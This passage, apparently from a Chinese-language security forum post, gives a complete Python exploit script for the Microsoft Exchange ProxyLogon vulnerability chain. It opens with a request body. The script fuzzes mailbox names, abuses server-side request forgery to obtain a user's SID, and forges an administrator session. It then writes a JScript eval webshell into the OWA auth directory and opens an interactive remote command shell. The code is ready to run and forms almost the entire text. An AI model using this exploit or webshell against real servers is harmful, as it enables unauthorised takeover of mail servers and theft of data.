{"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": "73fff9ed-d8f5-484e-9328-5b76048abdb2"}, "properties": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "FilePathName": "\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\BF2DmInPbRqNlrwT4CXo.aspx"}}}
```

攻击脚本
----

借用网上的exp

```python
# -*- coding: utf-8 -*-
import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import argparse
import sys
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

fuzz_email = ['administrator', 'webmaste', 'support', 'sales', 'contact', 'admin', 'test',
              'test2', 'test01', 'test1', 'guest', 'sysadmin', 'info', 'noreply', 'log', 'no-reply']

proxies = {}
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"

shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\test11.aspx"
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
# webshell-马子内容
shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],"unsafe");}</script>'

final_shell = ""

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

if __name__=="__main__":
    parser = argparse.ArgumentParser(
        description='Example: python exp.py -u 127.0.0.1 -user administrator -suffix @ex.com\n如果不清楚用户名，可不填写-user参数，将自动Fuzz用户名。')
    parser.add_argument('-u', type=str,
                        help='target')
    parser.add_argument('-user',
                        help='exist email', default='')
    parser.add_argument('-suffix',
                        help='email suffix')
    args = parser.parse_args()
    target = args.u
    suffix = args.suffix
    if suffix == "":
        print("请输入suffix")

    exist_email = args.user
    if exist_email:
        fuzz_email.insert(0, exist_email)
    random_name = id_generator(4) + ".js"
    print("目标 Exchange Server: " + target)

    for i in fuzz_email:
        new_email = i+suffix
        autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % new_email
        # print("get FQDN")
        FQDN = "EXCHANGE01"
        ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                            "User-Agent": user_agent},
                      verify=False, proxies=proxies)

        if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
            FQDN = ct.headers["X-FEServer"]
            print("got FQDN:" + FQDN)

        ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
            "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1941962757;" % FQDN,
            "Content-Type": "text/xml",
            "User-Agent": user_agent},
            data=autoDiscoverBody,
            proxies=proxies,
            verify=False
        )

        if ct.status_code != 200:
            print(ct.status_code)
            print("Autodiscover Error!")

        if "<LegacyDN>" not in str(ct.content):
            print("Can not get LegacyDN!")
        try:
            legacyDn = str(ct.content).split("<LegacyDN>")[
                1].split(r"</LegacyDN>")[0]
            print("Got DN: " + legacyDn)

            mapi_body = legacyDn + \
                "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" % FQDN,
                "Content-Type": "application/mapi-http",
                "X-Requesttype": "Connect",
                "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
                "X-Clientapplication": "Outlook/15.0.4815.1002",
                "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
                "User-Agent": user_agent
            },
                data=mapi_body,
                verify=False,
                proxies=proxies
            )
            if ct.status_code != 200 or "act as owner of a UserMailbox" not in str(ct.content):
                print("Mapi Error!")
                exit()

            sid = str(ct.content).split("with SID ")[
                1].split(" and MasterAccountSid")[0]

            print("Got SID: " + sid)
            sid = sid.replace(sid.split("-")[-1], "500")

            proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
            """ % sid

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
                "Content-Type": "text/xml",
                "msExchLogonMailbox": "S-1-5-20",
                "User-Agent": user_agent
            },
                data=proxyLogon_request,
                proxies=proxies,
                verify=False
            )
            if ct.status_code != 241 or not "set-cookie" in ct.headers:
                print("Proxylogon Error!")
                exit()

            sess_id = ct.headers['set-cookie'].split(
                "ASP.NET_SessionId=")[1].split(";")[0]

            msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[
                1].split(";")[0]
            print("Got session id: " + sess_id)
            print("Got canary: " + msExchEcpCanary)

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                # "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                # FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),

                "Cookie": "X-BEResource=Admin@{server_name}:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&schema=VirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sess_id}; msExchEcpCanary={msExchEcpCanary1}".
                            format(server_name=FQDN, msExchEcpCanary1=msExchEcpCanary, sess_id=sess_id,
                                    msExchEcpCanary=msExchEcpCanary),
                            "Content-Type": "application/json; charset=utf-8",
                            "msExchLogonMailbox": "S-1-5-20",
                            "User-Agent": user_agent

                            },
                            json={"filter": {
                                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                                "SelectedView": "", "SelectedVDirType": "OAB"}}, "sort": {}},
                            verify=False,
                            proxies=proxies
                            )

            if ct.status_code != 200:
                print("GetOAB Error!")
                exit()
            oabId = str(ct.content).split('"RawIdentity":"')[1].split('"')[0]
            print("Got OAB id: " + oabId)

            oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                        "properties": {
                            "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                        "ExternalUrl": "http://ffff/#%s" % shell_content}}}

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
                "msExchLogonMailbox": "S-1-5-20",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": user_agent
            },
                json=oab_json,
                proxies=proxies,
                verify=False
            )
            if ct.status_code != 200:
                print("Set external url Error!")
                exit()

            reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                            "properties": {
                                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                                "FilePathName": shell_absolute_path}}}

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
                "msExchLogonMailbox": "S-1-5-20",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": user_agent
            },
                json=reset_oab_body,
                proxies=proxies,
                verify=False
            )

            if ct.status_code != 200:
                print("写入shell失败")
                exit()
            shell_url = "https://"+target+"/owa/auth/test11.aspx"
            print("成功写入shell：" + shell_url)
            print("下面验证shell是否ok")
            print('code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());')
            print("正在请求shell")
            import time
            time.sleep(1)
            data = requests.post(shell_url, data={
                                "code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"}, verify=False, proxies=proxies)
            if data.status_code != 200:
                print("写入shell失败")
            else:
                print("shell:"+data.text.split("OAB (Default Web Site)")
                    [0].replace("Name                            : ", ""))
                print('[+]用户名: '+ new_email)
                final_shell = shell_url
                break
        except:
            print('[-]用户名: '+new_email)
            print("=============================")
    if not final_shell:
        sys.exit()
    print("下面启用交互式shell")
    while True:
        input_cmd = input("[#] command: ")
        data={"code": """Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())""" % input_cmd}
        ct = requests.post(
            final_shell,
            data=data,verify=False, proxies=proxies)
        if ct.status_code != 200 or "OAB (Default Web Site)" not in ct.text:
            print("[*] Failed to execute shell command")
        else:
            shell_response = ct.text.split(
                "Name                            :")[0]
            print(shell_response)
```

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-e9e24752f4cfe93b1adf1557246bae800e9552b5.png)